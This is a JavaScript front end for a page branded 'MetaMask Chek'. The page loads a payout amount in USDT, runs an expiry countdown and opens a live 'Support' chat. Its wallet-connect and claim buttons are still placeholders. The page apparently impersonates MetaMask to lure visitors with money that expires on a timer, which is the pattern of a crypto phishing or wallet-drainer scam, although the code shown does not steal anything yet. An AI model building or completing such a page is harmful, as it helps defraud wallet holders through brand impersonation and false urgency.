const params = new URLSearchParams(window.location.search);
const linkId = params.get("id");

// Elements
const checkTitleEl = document.getElementById("checkTitle");
const amountEl = document.getElementById("amount");
const currencyEl = document.getElementById("currency");
const expiresEl = document.getElementById("expires");

const btnConnect = document.getElementById("btnConnect");
const btnClaim = document.getElementById("btnClaim");

const chatFab = document.getElementById("chatFab");
const chatPanel = document.getElementById("chatPanel");
const chatClose = document.getElementById("chatClose");
const chatMessages = document.getElementById("chatMessages");
const chatMsg = document.getElementById("chatMsg");
const chatSend = document.getElementById("chatSend");

// Dummy buttons (for now)
btnConnect?.addEventListener("click", () => {
  alert("Wallet connect modal later (dummy for now).");
});
btnClaim?.addEventListener("click", () => {
  alert("Claim flow later (dummy for now).");
});

// Countdown (starts from 11:59)
let expiresAtMs = null;
let timerHandle = null;

function formatHHMMSS(totalSeconds) {
  const h = Math.floor(totalSeconds / 3600);
  const m = Math.floor((totalSeconds % 3600) / 60);
  const s = totalSeconds % 60;
  return (
    String(h).padStart(2, "0") + ":" +
    String(m).padStart(2, "0") + ":" +
    String(s).padStart(2, "0")
  );
}

function startCountdown() {
  if (!expiresEl) return;

  function tick() {
    const now = Date.now();
    const diffMs = Math.max(0, expiresAtMs - now);
    const diffSec = Math.floor(diffMs / 1000);

    expiresEl.textContent = formatHHMMSS(diffSec);

    if (diffSec <= 0) {
      // expired
      clearInterval(timerHandle);
      timerHandle = null;
    }
  }

  tick();
  timerHandle = setInterval(tick, 1000);
}


// Load link data
fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
  .then(r => r.json())
  .then(data => {
    if (!data.ok) {
      document.body.innerHTML = "Link not found";
      return;
    }

    // Title: MetaMask Chek #215480
    checkTitleEl.textContent = `MetaMask Chek #${data.id}`;

    // Amount: $1,250
    const num = Number(data.amount);
    const formatted = Number.isFinite(num)
      ? new Intl.NumberFormat("en-US").format(num)
      : String(data.amount);

    amountEl.textContent = `$${formatted}`;

    // currency: USDT
    currencyEl.textContent = `currency: ${String(data.currency).toUpperCase()}`;
    expiresAtMs = Number(data.expiresAt);
startCountdown();

  })
  .catch(() => {
    document.body.innerHTML = "Link not found";
    
  });

// Support chat: threadId per visitor per link
let threadId = localStorage.getItem("greenland_thread_" + linkId);
if (!threadId) {
  threadId = Math.random().toString(36).slice(2, 10);
  localStorage.setItem("greenland_thread_" + linkId, threadId);
}

// Open/close support panel
function openChat() {
  chatPanel.classList.add("open");
  chatPanel.setAttribute("aria-hidden", "false");
  chatMsg?.focus();
}
function closeChat() {
  chatPanel.classList.remove("open");
  chatPanel.setAttribute("aria-hidden", "true");
}

chatFab?.addEventListener("click", openChat);
chatClose?.addEventListener("click", closeChat);

// Render messages
function render(messages) {
  const lines = (messages || []).map(m => {
    const who = m.from === "visitor" ? "You" : "Support";
    const time = new Date(m.ts).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
    return `[${time}] ${who}: ${m.text}`;
  });
  chatMessages.textContent = lines.join("\n");
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

// Poll messages
function poll() {
  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId || "")}&threadId=${encodeURIComponent(threadId)}`)
    .then(r => r.json())
    .then(d => { if (d.ok) render(d.messages || []); })
    .catch(() => {})
    .finally(() => setTimeout(poll, 1500));
}
poll();

// Send message
function send() {
  const text = chatMsg.value.trim();
  if (!text) return;
  chatMsg.value = "";

  fetch("/api/support/send", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ linkId, threadId, text })
  }).catch(() => {});
}

chatSend?.addEventListener("click", send);
chatMsg?.addEventListener("keydown", (e) => {
  if (e.key === "Enter") send();
});
